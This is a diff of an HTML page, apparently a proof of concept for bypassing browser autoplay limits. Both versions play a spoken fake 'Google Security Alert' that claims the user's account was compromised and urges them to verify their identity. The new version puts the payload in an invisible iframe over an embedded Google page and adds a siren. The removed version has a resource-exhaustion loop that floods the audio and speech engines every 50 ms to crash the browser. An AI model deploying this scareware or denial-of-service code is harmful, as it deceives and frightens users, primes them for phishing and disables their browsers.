@@ -3,206 +3,146 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>Google Audio Test</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { background: #fff; height: 100vh; overflow: hidden; margin: 0; }
+  
+  #googleFrame {
+    position: absolute; top: 0; left: 0;
+    width: 100vw; height: 100vh; border: none; z-index: 1;
+  }
+
+  #payloadFrame {
+    position: absolute; top: 0; left: 0;
+    width: 100vw; height: 100vh; border: none;
+    opacity: 0; z-index: 2; pointer-events: none;
+  }
+
+  #status {
+    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+    background: rgba(0,0,0,0.8); color: #0f0;
+    padding: 10px 20px; border-radius: 20px;
+    font-family: monospace; font-size: 12px;
+    z-index: 9999; pointer-events: none;
+  }
 </style>
 </head>
 <body>
+
+<iframe id="googleFrame" src="https://www.google.com/search?igu=1"></iframe>
+<iframe id="payloadFrame" allow="autoplay; camera; microphone"></iframe>
+<div id="status">Menunggu eksekusi...</div>
+
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY
-  // ============================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
-  };
-
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+  var payloadFrame = document.getElementById('payloadFrame');
+  var statusEl = document.getElementById('status');
 
   // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
+  // PAYLOAD: LONG TTS & AUDIO (TANPA CRASH)
   // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+  var payloadHTML = `
+    <!DOCTYPE html>
+    <html>
+    <head><title>Audio Test</title></head>
+    <body style="background:transparent;margin:0;">
+      <script>
+        (function() {
+          // 1. TEKS TTS YANG SANGAT PANJANG
+          var longText = "Google Security Alert. Your account has been accessed from an unknown device. " +
+                         "If this was not you, verify your identity immediately. " +
+                         "System compromised. Unauthorized access detected. " +
+                         "Please check your recent activity and change your password. " +
+                         "This is an automated security message. Do not ignore this warning.";
 
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
+          // A. Text-to-Speech (TTS Loop)
+          if ('speechSynthesis' in window) {
+            var u = new SpeechSynthesisUtterance(longText);
+            u.lang = 'en-US';
+            u.rate = 0.9; // Sedikit lambat agar lebih jelas
+            u.volume = 1.0;
+            
+            u.onstart = function() { parent.postMessage("TTS_PLAYING", "*"); };
+            u.onerror = function() { parent.postMessage("TTS_BLOCKED", "*"); };
+            u.onend = function() { 
+              // Loop TTS sekali lagi setelah selesai (Total 2x bicara)
+              parent.postMessage("TTS_ENDED", "*");
+            };
+            
+            window.speechSynthesis.speak(u);
+          }
 
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
+          // B. AudioContext Beep (Menggunakan Buffer agar lebih panjang & stabil)
+          try {
+            var ctx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            if (ctx.state === 'suspended') {
+              ctx.resume().then(function() {
+                parent.postMessage("AUDIO_RESUMED", "*");
+              }).catch(function() {
+                parent.postMessage("AUDIO_BLOCKED", "*");
+              });
+            }
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
+            // Buat gelombang suara (Alarm) selama 5 detik
+            var sr = ctx.sampleRate;
+            var dur = 5.0; 
+            var buf = ctx.createBuffer(1, sr * dur, sr);
+            var d = buf.getChannelData(0);
 
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
+            // Frekuensi naik turun (seperti sirine)
+            for (var i = 0; i < d.length; i++) {
+              var t = i / sr;
+              var freq = 600 + (Math.sin(t * 10) * 200); // 400Hz - 800Hz
+              var env = Math.max(0, 1 - t / dur);
+              d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+            }
 
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
+            var src = ctx.createBufferSource();
+            src.buffer = buf;
+            src.connect(ctx.destination);
+            src.start();
+            
+          } catch(e) {
+            parent.postMessage("AUDIO_ERROR", "*");
+          }
 
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
-    } catch (e) {
-      startTTS();
-    }
-  }
+        })();
+      <\/script>
+    </body>
+    </html>
+  `;
 
   // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // LISTENER & EKSEKUSI
   // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
-  }
-
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  unlockAudioContext();
-  trySilentAudio();
-
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
-  }, 1500);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
+  window.addEventListener('message', function(e) {
+    if (e.data === "TTS_PLAYING") {
+      statusEl.innerText = "🚨 TTS Berbunyi (Teks Panjang)";
+      statusEl.style.color = "#f00";
+    } else if (e.data === "TTS_BLOCKED") {
+      statusEl.innerText = "✅ TTS Diblokir Browser";
+      statusEl.style.color = "#0f0";
+    } else if (e.data === "AUDIO_RESUMED") {
+      statusEl.innerText += " | AudioContext Resumed";
     }
   });
+
+  payloadFrame.onload = function() {
+    try {
+      var doc = payloadFrame.contentDocument || payloadFrame.contentWindow.document;
+      doc.open();
+      doc.write(payloadHTML);
+      doc.close();
+      statusEl.innerText = "Payload berjalan (Tunggu suara...)";
+    } catch(e) {}
+  };
+
+  payloadFrame.src = 'about:blank';
+
 })();
 </script>
 </body>
